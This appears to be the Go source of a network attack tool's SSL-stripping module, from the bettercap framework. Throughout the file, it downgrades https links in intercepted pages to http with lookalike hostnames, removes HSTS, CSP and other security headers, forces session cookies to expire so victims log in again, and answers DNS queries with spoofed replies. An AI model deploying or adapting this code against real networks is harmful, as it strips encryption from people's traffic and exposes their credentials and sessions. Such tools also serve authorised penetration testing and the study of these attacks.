package modules

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"regexp"
	"strings"
	"sync"

	"github.com/bettercap/bettercap/core"
	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/elazarl/goproxy"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/jpillora/go-tld"
)

var (
	httpsLinksParser = regexp.MustCompile(`https://[^"'/]+`)
	subdomains       = map[string]string{
		"www":     "wwwww",
		"webmail": "wwebmail",
		"mail":    "wmail",
		"m":       "wmobile",
	}
)

type cookieTracker struct {
	sync.RWMutex
	set map[string]bool
}

func NewCookieTracker() *cookieTracker {
	return &cookieTracker{
		set: make(map[string]bool),
	}
}

func (t *cookieTracker) domainOf(req *http.Request) string {
	if parsed, err := tld.Parse(req.Host); err != nil {
		log.Warning("Could not parse host %s: %s", req.Host, err)
		return req.Host
	} else {
		return parsed.Domain + "." + parsed.TLD
	}
}

func (t *cookieTracker) keyOf(req *http.Request) string {
	client := strings.Split(req.RemoteAddr, ":")[0]
	domain := t.domainOf(req)
	return fmt.Sprintf("%s-%s", client, domain)
}

func (t *cookieTracker) IsClean(req *http.Request) bool {
	t.RLock()
	defer t.RUnlock()

	// we only clean GET requests
	if req.Method != "GET" {
		return true
	}

	// does the request have any cookie?
	cookie := req.Header.Get("Cookie")
	if cookie == "" {
		return true
	}

	// was it already processed?
	if _, found := t.set[t.keyOf(req)]; found == true {
		return true
	}

	// unknown session cookie
	return false
}

func (t *cookieTracker) Track(req *http.Request) {
	t.Lock()
	defer t.Unlock()
	t.set[t.keyOf(req)] = true
}

func (t *cookieTracker) Expire(req *http.Request) *http.Response {
	domain := t.domainOf(req)
	redir := goproxy.NewResponse(req, "text/plain", 302, "")

	for _, c := range req.Cookies() {
		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, domain))
		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, c.Domain))
	}

	redir.Header.Add("Location", req.URL.String())
	redir.Header.Add("Connection", "close")

	return redir
}

type hostTracker struct {
	sync.RWMutex
	hosts map[string]string
}

func NewHostTracker() *hostTracker {
	return &hostTracker{
		hosts: make(map[string]string, 0),
	}
}

func (t *hostTracker) Track(host, stripped string) {
	t.Lock()
	defer t.Unlock()
	t.hosts[stripped] = host
}

func (t *hostTracker) Unstrip(stripped string) string {
	t.RLock()
	defer t.RUnlock()
	if original, found := t.hosts[stripped]; found == true {
		return original
	}
	return ""
}

type SSLStripper struct {
	enabled       bool
	session       *session.Session
	cookies       *cookieTracker
	hosts         *hostTracker
	handle        *pcap.Handle
	pktSourceChan chan gopacket.Packet
}

func NewSSLStripper(s *session.Session, enabled bool) *SSLStripper {
	strip := &SSLStripper{
		enabled: false,
		cookies: NewCookieTracker(),
		hosts:   NewHostTracker(),
		session: s,
		handle:  nil,
	}
	strip.Enable(enabled)
	return strip
}

func (s *SSLStripper) Enabled() bool {
	return s.enabled
}

func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, address net.IP, req *layers.DNS, target net.HardwareAddr) {
	redir := fmt.Sprintf("(->%s)", address)
	who := target.String()

	if t, found := s.session.Lan.Get(target.String()); found == true {
		who = t.String()
	}

	log.Info("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(who))

	var err error
	var src, dst net.IP

	nlayer := pkt.NetworkLayer()
	if nlayer == nil {
		log.Debug("Missing network layer skipping packet.")
		return
	}

	var ipv6 bool

	if nlayer.LayerType() == layers.LayerTypeIPv4 {
		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = false

	} else {
		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = true
	}

	eth := layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: layers.EthernetTypeIPv6,
	}

	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   1024,
				IP:    address,
			})
	}

	dns := layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	var raw []byte

	if ipv6 == true {
		ip6 := layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolUDP,
			HopLimit:   64,
			SrcIP:      src,
			DstIP:      dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip6)

		err, raw = packets.Serialize(&eth, &ip6, &udp, &dns)
		if err != nil {
			log.Error("Error serializing packet: %s.", err)
			return
		}
	} else {
		ip4 := layers.IPv4{
			Protocol: layers.IPProtocolUDP,
			Version:  4,
			TTL:      64,
			SrcIP:    src,
			DstIP:    dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip4)

		err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
		if err != nil {
			log.Error("Error serializing packet: %s.", err)
			return
		}
	}

	log.Debug("Sending %d bytes of packet ...", len(raw))
	if err := s.session.Queue.Send(raw); err != nil {
		log.Error("Error sending packet: %s", err)
	}
}

func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}

	eth := typeEth.(*layers.Ethernet)
	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
	if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
		udp := typeUDP.(*layers.UDP)
		for _, q := range dns.Questions {
			domain := string(q.Name)
			original := s.hosts.Unstrip(domain)
			if original != "" {
				if address, err := net.LookupIP(original); err == nil && len(address) > 0 {
					s.dnsReply(pkt, eth, udp, domain, address[0], dns, eth.SrcMAC)
				} else {
					log.Error("Could not resolve %s: %s", original, err)
				}
			}
		}
	}
}

func (s *SSLStripper) Enable(enabled bool) {
	s.enabled = enabled

	if enabled == true && s.handle == nil {
		var err error

		if s.handle, err = pcap.OpenLive(s.session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
			panic(err)
		}

		if err = s.handle.SetBPFFilter("udp"); err != nil {
			panic(err)
		}

		go func() {
			defer func() {
				s.handle.Close()
				s.handle = nil
			}()

			for s.enabled {
				src := gopacket.NewPacketSource(s.handle, s.handle.LinkType())
				s.pktSourceChan = src.Packets()
				for packet := range s.pktSourceChan {
					if s.enabled == false {
						break
					}

					s.onPacket(packet)
				}
			}
		}()
	}
}

func (s *SSLStripper) stripRequestHeaders(req *http.Request) {
	req.Header.Del("Accept-Encoding")
	req.Header.Del("If-None-Match")
	req.Header.Del("If-Modified-Since")
	req.Header.Del("Upgrade-Insecure-Requests")

	req.Header.Set("Pragma", "no-cache")
}

func (s *SSLStripper) stripResponseHeaders(res *http.Response) {
	res.Header.Del("Content-Security-Policy-Report-Only")
	res.Header.Del("Content-Security-Policy")
	res.Header.Del("Strict-Transport-Security")
	res.Header.Del("Public-Key-Pins")
	res.Header.Del("Public-Key-Pins-Report-Only")
	res.Header.Del("X-Frame-Options")
	res.Header.Del("X-Content-Type-Options")
	res.Header.Del("X-WebKit-CSP")
	res.Header.Del("X-Content-Security-Policy")
	res.Header.Del("X-Download-Options")
	res.Header.Del("X-Permitted-Cross-Domain-Policies")
	res.Header.Del("X-Xss-Protection")

	res.Header.Set("Allow-Access-From-Same-Origin", "*")
	res.Header.Set("Access-Control-Allow-Origin", "*")
	res.Header.Set("Access-Control-Allow-Methods", "*")
	res.Header.Set("Access-Control-Allow-Headers", "*")
}

// sslstrip preprocessing, takes care of:
//
// - patching / removing security related headers
// - making unknown session cookies expire
// - handling stripped domains
func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
	if s.enabled == false {
		return
	}

	// preprocess request headers
	s.stripRequestHeaders(req)

	// check if we need to redirect the user in order
	// to make unknown session cookies expire
	if s.cookies.IsClean(req) == false {
		log.Info("[%s] Sending expired cookies for %s to %s", core.Green("sslstrip"), core.Yellow(req.Host), req.RemoteAddr)
		s.cookies.Track(req)
		redir = s.cookies.Expire(req)
	}

	return
}

func (s *SSLStripper) isHTML(res *http.Response) bool {
	for name, values := range res.Header {
		for _, value := range values {
			if name == "Content-Type" {
				return strings.HasPrefix(value, "text/html")
			}
		}
	}

	return false
}

func (s *SSLStripper) processURL(url string) string {
	// first we remove the https schema
	url = strings.Replace(url, "https://", "http://", 1)

	// search for a known subdomain and replace it
	found := false
	for sub, repl := range subdomains {
		what := fmt.Sprintf("://%s", sub)
		with := fmt.Sprintf("://%s", repl)
		if strings.Contains(url, what) {
			url = strings.Replace(url, what, with, 1)
			found = true
			break
		}
	}
	// fallback
	if found == false {
		url = strings.Replace(url, "://", "://wwww.", 1)
	}

	return url
}

func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
	if s.enabled == false {
		return
	} else if s.isHTML(res) == false {
		return
	}

	// process response headers
	s.stripResponseHeaders(res)

	// fetch the HTML body
	raw, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Error("Could not read response body: %s", err)
		return
	}

	body := string(raw)
	urls := make(map[string]string, 0)
	matches := httpsLinksParser.FindAllString(body, -1)
	for _, url := range matches {
		urls[url] = s.processURL(url)
	}

	for url, stripped := range urls {
		log.Info("Stripping url %s to %s", core.Bold(url), core.Yellow(stripped))

		body = strings.Replace(body, url, stripped, -1)

		hostOriginal := strings.Replace(url, "https://", "", 1)
		hostStripped := strings.Replace(stripped, "http://", "", 1)
		s.hosts.Track(hostOriginal, hostStripped)
	}

	// reset the response body to the original unread state
	res.Body = ioutil.NopCloser(strings.NewReader(body))
}
